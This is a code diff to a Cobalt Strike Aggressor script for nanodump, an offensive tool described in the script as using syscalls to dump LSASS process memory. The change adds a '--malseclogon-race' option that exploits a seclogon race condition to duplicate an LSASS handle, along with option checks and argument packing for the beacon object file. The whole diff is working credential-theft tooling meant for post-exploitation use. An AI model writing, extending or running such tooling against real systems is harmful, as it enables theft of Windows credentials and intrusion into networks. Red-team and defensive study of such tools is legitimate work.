@@ -41,9 +41,9 @@ local('$string $c');
 beacon_command_register(
 "nanodump",
 "Use syscalls to dump LSASS.",
-"Usage: nanodump [--getpid] [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--fork] [--snapshot] [--dup] [--malseclogon] [--binary C:\\Windows\\notepad.exe] [--werfault C:\\Windows\\Temp]");
+"Usage: nanodump [--getpid] [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--fork] [--snapshot] [--dup] [--malseclogon] [--binary C:\\Windows\\notepad.exe] [--malseclogon-race] [--werfault C:\\Windows\\Temp]");
 alias nanodump {
-    local('$barch $handle $bof $exe $args $pid $cname $dump_path $write_file $use_valid_sig $fork $snapshot $dup $i $get_pid $use_malseclogon $folder $nanodump_binary $werfault_lsass $use_werfault');
+    local('$barch $handle $bof $exe $args $pid $cname $dump_path $write_file $use_valid_sig $fork $snapshot $dup $i $get_pid $use_malseclogon $folder $nanodump_binary $werfault_lsass $use_werfault $use_malseclogon_race');
 
     $barch = barch($1);
     if($barch eq "x86")
@@ -76,6 +76,8 @@ alias nanodump {
     $binary_path = "";
     # by default, do not use MalSecLogon
     $use_malseclogon = 0;
+    # by default, do not use the MalSecLogon race condition
+    $use_malseclogon_race = 0;
     # by default, do not get the PID of LSASS
     $get_pid = 0;
     # by default, nanodump will find the PID of LSASS dinamically
@@ -170,6 +172,11 @@ alias nanodump {
                 return;
             }
         }
+        else if (@_[$i] eq "--malseclogon-race" || @_[$i] eq "-mr")
+        {
+            # use the seclogon race condition to dup an LSASS handle
+            $use_malseclogon_race = 1;
+        }
         else if (@_[$i] eq "--werfault" || @_[$i] eq "-wf")
         {
             $i++;
@@ -192,8 +199,9 @@ alias nanodump {
             return;
         }
     }
+
     if ($use_werfault &&
-        ($fork || $snapshot || $dup ||
+        ($fork || $snapshot || $dup || $use_malseclogon_race ||
          $use_malseclogon || $use_valid_sig || $get_pid ||
          strlen($binary_path) != 0 || $write_file))
      {
@@ -231,6 +239,15 @@ alias nanodump {
         return;
     }
 
+    if ($use_malseclogon_race &&
+        ($fork || $snapshot || $dup || $use_werfault ||
+         $use_malseclogon || $get_pid ||
+         strlen($binary_path) != 0))
+     {
+        berror($1, "The option --malseclogon-race can only be used with --write and --valid");
+        return;
+     }
+
     if($use_malseclogon && $dup == 0)
     {
         $folder = "C:\\Windows\\Temp";
@@ -250,7 +267,7 @@ alias nanodump {
     }
 
     # pack the arguments
-    $args = bof_pack($1, "iziiiiiiiziz", $pid, $dump_path, $write_file, $use_valid_sig, $fork, $snapshot, $dup, $get_pid, $use_malseclogon, $binary_path, $use_werfault, $werfault_lsass);
+    $args = bof_pack($1, "iziiiiiiiziiz", $pid, $dump_path, $write_file, $use_valid_sig, $fork, $snapshot, $dup, $get_pid, $use_malseclogon, $binary_path, $use_malseclogon_race, $use_werfault, $werfault_lsass);
 
     # run
     btask($1, "Running NanoDump BOF");
